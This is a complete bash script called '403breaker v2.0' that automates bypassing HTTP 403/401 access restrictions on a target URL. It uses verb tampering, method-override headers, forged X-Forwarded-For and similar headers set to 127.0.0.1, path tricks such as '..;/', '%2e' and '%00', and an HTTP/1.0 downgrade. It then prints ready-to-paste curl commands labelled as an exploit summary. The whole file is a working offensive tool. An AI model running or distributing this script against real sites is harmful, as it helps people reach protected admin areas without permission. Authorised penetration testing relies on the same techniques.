#!/bin/bash

# ==============================================================================
# TITLE: 403breaker v2.0 (Reporter Edition)
# AUTHOR: ?
# DESCRIPTION: Automated 403 Bypasser with Actionable Exploit Summary
# USAGE: ./403breaker_v2.sh https://target.com/admin
# ==============================================================================

TARGET="$1"
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"

# Colors
BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Array to store successful hits
declare -a VULN_REPORT

banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo "  __ __  ____  _____  _                     _               "
    echo " / // / / __ \|___ / | |__  _ __ ___   __ _| | _____ _ __   "
    echo "/ // /_/ / / /  |_ \ | '_ \| '__/ _ \ / _\` | |/ / _ \ '__|  "
    echo "/__  _/ /_/ /  ___) || |_) | | |  __/| (_| |   <  __/ |     "
    echo "  /_/ \____/  |____/ |_.__/|_|  \___| \__,_|_|\_\___|_| v2.0"
    echo -e "${NC}"
    echo -e "      ${BLUE}:: Target: $TARGET ::${NC}"
    echo "------------------------------------------------------------"
}

if [ -z "$TARGET" ]; then
    echo -e "${RED}[!] Usage: $0 <URL>${NC}"
    echo -e "${YELLOW}    Example: $0 https://example.com/admin${NC}"
    exit 1
fi

# Function to perform request
check_bypass() {
    local TECH_NAME="$1"
    local URL="$2"
    local ARGS="$3"
    
    # Run curl
    RESPONSE=$(curl -s -k -A "$USER_AGENT" -o /dev/null -w "%{http_code}:%{size_download}" $ARGS "$URL")
    CODE=$(echo "$RESPONSE" | cut -d':' -f1)
    SIZE=$(echo "$RESPONSE" | cut -d':' -f2)

    # Determine Color & Status
    local IS_INTERESTING=0
    
    if [[ "$CODE" == "200" ]]; then
        COLOR="$GREEN"
        IS_INTERESTING=1
    elif [[ "$CODE" =~ ^3 ]]; then # 301, 302, 307
        COLOR="$YELLOW"
        IS_INTERESTING=1
    elif [[ "$CODE" == "403" || "$CODE" == "401" ]]; then
        COLOR="$RED"
    else
        COLOR="$CYAN"
    fi

    # Detect Size Anomaly
    SIZE_MARKER=""
    if [ "$SIZE" != "$BASE_SIZE" ]; then
        SIZE_MARKER="${MAGENTA}(Diff)${NC}"
        # If code is 403 but size is different, it might be interesting (info leak)
        if [[ "$CODE" == "403" ]]; then
             IS_INTERESTING=2 
        fi
    fi

    printf "${BOLD}%-30s${NC} | Code: ${COLOR}%-3s${NC} | Size: %-6s %b\n" "$TECH_NAME" "$CODE" "$SIZE" "$SIZE_MARKER"

    # Store interesting findings for the summary
    if [ "$IS_INTERESTING" -eq 1 ]; then
        # Construct the exact curl command
        CLEAN_ARGS=$(echo $ARGS | sed "s/'/\"/g") # Normalize quotes for display
        VULN_REPORT+=("${COLOR}[$CODE]${NC} :: $TECH_NAME :: curl -k -v $CLEAN_ARGS \"$URL\"")
    elif [ "$IS_INTERESTING" -eq 2 ]; then
        CLEAN_ARGS=$(echo $ARGS | sed "s/'/\"/g")
        VULN_REPORT+=("${MAGENTA}[$CODE/Diff]${NC} :: $TECH_NAME (Size: $SIZE) :: curl -k -v $CLEAN_ARGS \"$URL\"")
    fi
}

banner

# --- STEP 0: BASELINE ---
echo -e "${BOLD}[*] Establishing Baseline...${NC}"
BASE_RESP=$(curl -s -k -A "$USER_AGENT" -o /dev/null -w "%{http_code}:%{size_download}" "$TARGET")
BASE_CODE=$(echo "$BASE_RESP" | cut -d':' -f1)
BASE_SIZE=$(echo "$BASE_RESP" | cut -d':' -f2)
echo -e "    -> Baseline Code: ${RED}$BASE_CODE${NC}"
echo -e "    -> Baseline Size: $BASE_SIZE bytes"
echo "------------------------------------------------------------"

# --- STEP 1: VERB TAMPERING ---
echo -e "${BOLD}[*] Testing HTTP Verbs & Overrides${NC}"
VERBS=("POST" "HEAD" "TRACE" "PUT" "OPTIONS")
for VERB in "${VERBS[@]}"; do
    check_bypass "Method: $VERB" "$TARGET" "-X $VERB"
done
check_bypass "Override: X-HTTP-Method" "$TARGET" "-H 'X-HTTP-Method-Override: PUT'"
check_bypass "Override: X-Method" "$TARGET" "-H 'X-HTTP-Method: PUT'"

# --- STEP 2: HEADER SPOOFING ---
echo -e "\n${BOLD}[*] Testing Header Spoofing${NC}"
HEADERS=(
    "X-Originating-IP: 127.0.0.1" "X-Forwarded-For: 127.0.0.1" "X-Forwarded: 127.0.0.1"
    "Forwarded-For: 127.0.0.1" "X-Remote-IP: 127.0.0.1" "X-Remote-Addr: 127.0.0.1"
    "X-Client-IP: 127.0.0.1" "Client-IP: 127.0.0.1" "X-Real-IP: 127.0.0.1"
    "X-Custom-IP-Authorization: 127.0.0.1"
)
for HEADER in "${HEADERS[@]}"; do
    NAME=$(echo "$HEADER" | cut -d':' -f1)
    check_bypass "Header: $NAME" "$TARGET" "-H '$HEADER'"
done

# --- STEP 3: PATH MANIPULATION ---
echo -e "\n${BOLD}[*] Testing Path Manipulation${NC}"
CLEAN_URL="${TARGET%/}"
SUFFIXES=("/" "/." "//." "/./" "?" "#" ";" "..;/" ".json" "%20" "%09" "%00")

for SUFFIX in "${SUFFIXES[@]}"; do
    check_bypass "Path Suffix: $SUFFIX" "${CLEAN_URL}${SUFFIX}" ""
done

LAST_SEGMENT="${CLEAN_URL##*/}"
BASE_PATH="${CLEAN_URL%/*}"
if [ "$BASE_PATH" != "$CLEAN_URL" ]; then
    check_bypass "Path Infix: /%2e/" "${BASE_PATH}/%2e/${LAST_SEGMENT}" ""
    check_bypass "Path Infix: /.;/" "${BASE_PATH}/.;/${LAST_SEGMENT}" ""
    check_bypass "Path Infix: /;/" "${BASE_PATH}/;/${LAST_SEGMENT}" ""
    check_bypass "Path Case: UPPER" "${BASE_PATH}/${LAST_SEGMENT^^}" ""
else
    check_bypass "Path: //" "${CLEAN_URL}//" ""
    check_bypass "Path: /./" "${CLEAN_URL}/./" ""
fi

# --- STEP 4: PROTOCOL ---
echo -e "\n${BOLD}[*] Testing Protocol Downgrade${NC}"
check_bypass "Protocol: HTTP/1.0" "$TARGET" "--http1.0"

# --- SUMMARY REPORT ---
echo -e "\n------------------------------------------------------------"
echo -e "${BOLD} 🔥 EXPLOIT SUMMARY (COPY & PASTE) 🔥${NC}"
echo -e "------------------------------------------------------------"

if [ ${#VULN_REPORT[@]} -eq 0 ]; then
    echo -e "${RED}[X] No obvious bypasses found.${NC}"
else
    for LINE in "${VULN_REPORT[@]}"; do
        echo -e "$LINE"
    done
    echo -e "\n${YELLOW}[!] Tip: If you see a [3XX], use the curl command provided"
    echo -e "    and look at the 'Location' header or add '-L' to follow it.${NC}"
fi
echo "------------------------------------------------------------"
